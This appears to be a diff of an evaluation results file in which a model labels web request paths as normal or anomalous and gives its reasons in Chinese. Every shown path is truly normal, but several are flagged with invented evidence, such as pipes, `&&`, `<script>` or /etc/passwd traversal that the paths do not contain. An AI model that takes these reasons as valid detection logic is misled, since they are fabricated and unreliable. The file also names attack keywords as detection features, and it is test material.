+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`/javascript/iissamples.php3`，其中`javascript`和`iissamples.php3`明显是JavaScript代码，这属于XSS攻击的典型特征。此外，URL中没有正常的业务数据或参数，也没有明显的SQL注入、命令执行等攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/xairon_v2/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /xairon_v2/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.447,
+    "raw_response": "- 0 表示正常URL\n\nURL: /xairon_v2/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/dragon-sunglasses/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /dragon-sunglasses/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.532,
+    "raw_response": "- 0 表示正常URL\n\nURL: /dragon-sunglasses/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/currentstudies/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /currentstudies/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.916,
+    "raw_response": "- 0 表示正常URL\n\nURL: /currentstudies/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/emifile2379/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /emifile2379 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.46,
+    "raw_response": "- 0 表示正常URL\n\nURL: /emifile2379 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/~jacob.core",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript/~jacob.core`，其中`javascript`是典型的XSS攻击特征，且`/~`是常见的命令注入攻击特征。该URL包含恶意脚本，可能用于执行远程代码或窃取敏感信息。",
+    "elapsed_time_sec": 1.759,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript/~jacob.core`，其中`javascript`是典型的XSS攻击特征，且`/~`是常见的命令注入攻击特征。该URL包含恶意脚本，可能用于执行远程代码或窃取敏感信息。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/open.save",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且使用了`javascript:`，这属于XSS攻击特征，可能被恶意脚本利用。",
+    "elapsed_time_sec": 1.134,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且使用了`javascript:`，这属于XSS攻击特征，可能被恶意脚本利用。",
+    "true_label": "0"
+  },
+  {
+    "url": "/031330517x/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.864,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/bluetopl/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /bluetopl/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.56,
+    "raw_response": "- 0 表示正常URL\n\nURL: /bluetopl/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/cuff_link/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /cuff_link/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.563,
+    "raw_response": "- 0 表示正常URL\n\nURL: /cuff_link/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/lcd soundsystem - lcd soundsystem/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含重复的“- lcd soundsystem”部分，这可能表示恶意的路径遍历或文件包含攻击，例如尝试访问 `/etc/passwd` 或 `/etc/shadow` 等敏感路径。此外，URL中没有明显的SQL注入、XSS、命令执行或文件包含的特征，因此判定为异常。",
+    "elapsed_time_sec": 2.24,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含重复的“- lcd soundsystem”部分，这可能表示恶意的路径遍历或文件包含攻击，例如尝试访问 `/etc/passwd` 或 `/etc/shadow` 等敏感路径。此外，URL中没有明显的SQL注入、XSS、命令执行或文件包含的特征，因此判定为异常。",
+    "true_label": "0"
+  },
+  {
+    "url": "/weather_sites/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL是正常Web请求，符合安全标准。正常请求应仅包含常规路径和静态资源访问，且参数值应为业务数据，无攻击性特征。",
+    "elapsed_time_sec": 1.19,
+    "raw_response": "- 0 表示正常URL\n\n该URL是正常Web请求，符合安全标准。正常请求应仅包含常规路径和静态资源访问，且参数值应为业务数据，无攻击性特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/156211/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /156211 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.457,
+    "raw_response": "- 0 表示正常URL\n\nURL: /156211 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/tactics/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /tactics/ 是正常Web请求，符合标准的HTTP请求格式，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.909,
+    "raw_response": "- 0 表示正常URL\n\nURL: /tactics/ 是正常Web请求，符合标准的HTTP请求格式，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/nextarrow/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /nextarrow/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，没有使用任何恶意攻击特征。",
+    "elapsed_time_sec": 1.189,
+    "raw_response": "- 0 表示正常URL\n\nURL: /nextarrow/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，没有使用任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/101996/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /101996 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.427,
+    "raw_response": "- 0 表示正常URL\n\nURL: /101996 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/superthemes/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /superthemes/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.506,
+    "raw_response": "- 0 表示正常URL\n\nURL: /superthemes/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/fid3edc55edb6ea67317d0377d527ef20508adf6578/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含远程命令执行（`|`、`&&`、`shell`等）",
+    "elapsed_time_sec": 1.172,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含远程命令执行（`|`、`&&`、`shell`等）",
+    "true_label": "0"
+  },
+  {
+    "url": "/midwinwashoff/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /midwinwashoff/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.593,
+    "raw_response": "- 0 表示正常URL\n\nURL: /midwinwashoff/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/p54-11/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /p54-11 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.465,
+    "raw_response": "- 0 表示正常URL\n\nURL: /p54-11 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/statement.save",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且使用了`statement.save`作为请求路径，这属于典型的XSS攻击特征，因为`<script>`标签被用于执行恶意代码。此外，该URL也包含`javascript`等攻击特征，可能用于执行远程命令或注入攻击。",
+    "elapsed_time_sec": 1.988,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且使用了`statement.save`作为请求路径，这属于典型的XSS攻击特征，因为`<script>`标签被用于执行恶意代码。此外，该URL也包含`javascript`等攻击特征，可能用于执行远程命令或注入攻击。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/next.phtml",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/next.phtml`路径，这属于典型的XSS攻击特征，因为JavaScript代码可能被恶意注入到页面中，从而执行恶意脚本。",
+    "elapsed_time_sec": 1.546,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/next.phtml`路径，这属于典型的XSS攻击特征，因为JavaScript代码可能被恶意注入到页面中，从而执行恶意脚本。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/windows.manifest",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript:`，这属于XSS攻击特征。此外，URL中包含`windows.manifest`，这可能被恶意利用来执行命令或注入恶意代码。",
+    "elapsed_time_sec": 1.501,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript:`，这属于XSS攻击特征。此外，URL中包含`windows.manifest`，这可能被恶意利用来执行命令或注入恶意代码。",
+    "true_label": "0"
+  },
+  {
+    "url": "/ipdgroup/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /ipdgroup/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.587,
+    "raw_response": "- 0 表示正常URL\n\nURL: /ipdgroup/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/img-aasggiwxjr/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.851,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/tk30052-nothing/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /tk30052-nothing/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.8,
+    "raw_response": "- 0 表示正常URL\n\nURL: /tk30052-nothing/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/orig.lib",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript/orig.lib`路径，这属于典型的XSS攻击特征，因为`javascript`标签本身是XSS攻击的常见手段。此外，路径包含`orig.lib`，这可能被恶意利用来执行远程命令或注入SQL等攻击。",
+    "elapsed_time_sec": 2.095,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript/orig.lib`路径，这属于典型的XSS攻击特征，因为`javascript`标签本身是XSS攻击的常见手段。此外，路径包含`orig.lib`，这可能被恶意利用来执行远程命令或注入SQL等攻击。",
+    "true_label": "0"
+  },
+  {
+    "url": "/arctic_assault/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /arctic_assault/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.627,
+    "raw_response": "- 0 表示正常URL\n\nURL: /arctic_assault/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/~root.ws",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript/~root.ws`，其中`javascript`和`~`是典型的XSS攻击特征，攻击者可能通过恶意脚本注入恶意代码，导致用户被攻击。此外，`/~`表示路径遍历，可能被用于远程代码执行。",
+    "elapsed_time_sec": 1.963,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript/~root.ws`，其中`javascript`和`~`是典型的XSS攻击特征，攻击者可能通过恶意脚本注入恶意代码，导致用户被攻击。此外，`/~`表示路径遍历，可能被用于远程代码执行。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/javascript.dll",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `javascript`，这属于命令注入的特征。",
+    "elapsed_time_sec": 0.996,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `javascript`，这属于命令注入的特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/storage.cfm",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "elapsed_time_sec": 0.909,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/ubuntu.tar.bz2",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `shell`（命令执行）",
+    "elapsed_time_sec": 1.105,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `shell`（命令执行）",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/other.key",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`、`javascript:` 等 XSS 跨站脚本特征",
+    "elapsed_time_sec": 1.149,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`、`javascript:` 等 XSS 跨站脚本特征",
+    "true_label": "0"
+  },
+  {
+    "url": "/webshop-off/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /webshop-off/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.179,
+    "raw_response": "- 0 表示正常URL\n\nURL: /webshop-off/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/000023621/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /000023621 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.536,
+    "raw_response": "- 0 表示正常URL\n\nURL: /000023621 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/beautiful_vision/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /beautiful_vision/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.559,
+    "raw_response": "- 0 表示正常URL\n\nURL: /beautiful_vision/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/icaris/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /icaris/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.553,
+    "raw_response": "- 0 表示正常URL\n\nURL: /icaris/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/bottom.trace",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，这属于XSS攻击特征，且包含`trace`，属于路径遍历攻击特征。",
+    "elapsed_time_sec": 1.119,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，这属于XSS攻击特征，且包含`trace`，属于路径遍历攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/bbcdp13/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /bbcdp13/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.465,
+    "raw_response": "- 0 表示正常URL\n\nURL: /bbcdp13/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/4013185/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /4013185 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.486,
+    "raw_response": "- 0 表示正常URL\n\nURL: /4013185 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/dinosaurs19/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /dinosaurs19/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.435,
+    "raw_response": "- 0 表示正常URL\n\nURL: /dinosaurs19/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/router-memory/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /router-memory/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.549,
+    "raw_response": "- 0 表示正常URL\n\nURL: /router-memory/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/t_mall7/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /t_mall7/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.619,
+    "raw_response": "- 0 表示正常URL\n\nURL: /t_mall7/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/200601bysubject/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /200601bysubject/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。请求格式正确，参数值为正常业务数据，且未包含任何攻击性代码或路径。因此，该URL判定为正常请求。",
+    "elapsed_time_sec": 2.266,
+    "raw_response": "- 0 表示正常URL\n\nURL: /200601bysubject/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。请求格式正确，参数值为正常业务数据，且未包含任何攻击性代码或路径。因此，该URL判定为正常请求。",
+    "true_label": "0"
+  },
+  {
+    "url": "/main/is_cgi_installed3_main.php794174479~",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 shell 命令 `|`、`;`、`&&` 等命令注入特征。",
+    "elapsed_time_sec": 1.299,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 shell 命令 `|`、`;`、`&&` 等命令注入特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/prepart22/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /prepart22/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.598,
+    "raw_response": "- 0 表示正常URL\n\nURL: /prepart22/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/perignon/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /perignon/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.917,
+    "raw_response": "- 0 表示正常URL\n\nURL: /perignon/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/oaktable_19/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /oaktable_19/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.756,
+    "raw_response": "- 0 表示正常URL\n\nURL: /oaktable_19/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/image_testing/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /image_testing/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.523,
+    "raw_response": "- 0 表示正常URL\n\nURL: /image_testing/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/game-708/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /game-708/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.782,
+    "raw_response": "- 0 表示正常URL\n\nURL: /game-708/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/452139/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /452139 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.842,
+    "raw_response": "- 0 表示正常URL\n\nURL: /452139 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/nsct2006/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /nsct2006/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.527,
+    "raw_response": "- 0 表示正常URL\n\nURL: /nsct2006/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/partner_overview/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /partner_overview/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.597,
+    "raw_response": "- 0 表示正常URL\n\nURL: /partner_overview/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/telnetd_version/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /telnetd_version/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.586,
+    "raw_response": "- 0 表示正常URL\n\nURL: /telnetd_version/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/virtuallight/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /virtuallight/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.587,
+    "raw_response": "- 0 表示正常URL\n\nURL: /virtuallight/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/135630/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /135630 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.463,
+    "raw_response": "- 0 表示正常URL\n\nURL: /135630 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/notamemberyet_red/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.865,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
